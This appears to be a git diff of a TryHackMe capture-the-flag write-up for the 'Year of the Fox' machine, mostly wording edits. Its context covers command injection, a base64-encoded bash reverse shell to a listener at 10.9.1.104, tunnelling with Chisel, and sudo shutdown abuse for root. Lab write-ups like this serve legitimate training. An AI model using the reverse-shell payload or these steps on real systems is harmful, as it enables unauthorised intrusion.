@@ -1,3 +1,4 @@
+title: "THM: Year of the Fox Writeup"
 | **Machine**             | \[Year of the Fox]                                                                                                                  |
 | :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
 | **Platform**            | TryHackMe                                                                                                                    |
@@ -99,9 +100,7 @@ I intercept the request and inject a payload to test and reach my listener:
 
 <img width="2873" height="1074" alt="2025-08-07 154848" src="https://github.com/user-attachments/assets/f6b308c7-df81-42b9-8de3-5df4b4c44c83" />
 
-Command injection confirmed.
-
-Tried multiple reverse shell payloads but all of them didn’t work for unknown reasons. Eventually i created a base64 encoded one and it worked.
+Command injection confirmed, so we can create a payload now and get a shell. But I Tried multiple reverse shell payloads and all of them didn’t work for unknown reasons. Eventually i created a base64 encoded one and it worked.
 
 ```bash
 echo 'YmFzaCAtYyAiL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuMS4xMDQvOTAwMSAwPiYxIgo=' | base64 -d  | bash
@@ -124,8 +123,10 @@ THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
 
 In /var/www/files, we find creds2.txt, base32 and base64-encoded
 
+```bash
 cat creds2.txt 
 LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2...
+```
 
 Tried decoding it but nothing clear yet.
 
@@ -133,7 +134,7 @@ Next, I notice port 22 is open internally only. Time to pivot.
 <img width="1486" height="635" alt="2025-08-07 163258" src="https://github.com/user-attachments/assets/8d9dfe80-acc9-4dbb-b918-684f4911e4bc" />
 
 
-I spent an hour trying to create a tunnel with Ligolo-ng, which had greatly helped me during the CPTS certification. However on this machine the agent kept dropping and eventually, I had to give up and move on to other options—specifically, using Chisel
+I spent an hour trying to create a tunnel with Ligolo-ng, which had greatly helped me during the CPTS certification. However on this machine the agent kept dropping and eventually, I had to give up and move on to using Chisel
 
 ```bash
 
@@ -191,7 +192,7 @@ User fox may run the following commands on year-of-the-fox:
   (root) NOPASSWD: /usr/sbin/shutdown
 ```
 
-I found [[this]](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation) article about abusing shutdown binary to get root.
+I found [this](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation) article about abusing shutdown binary to get root.
 
 >If we can execute **"shutdown"** command as root, we can gain access to privileges by overwriting the path of **"poweroff"**.
 
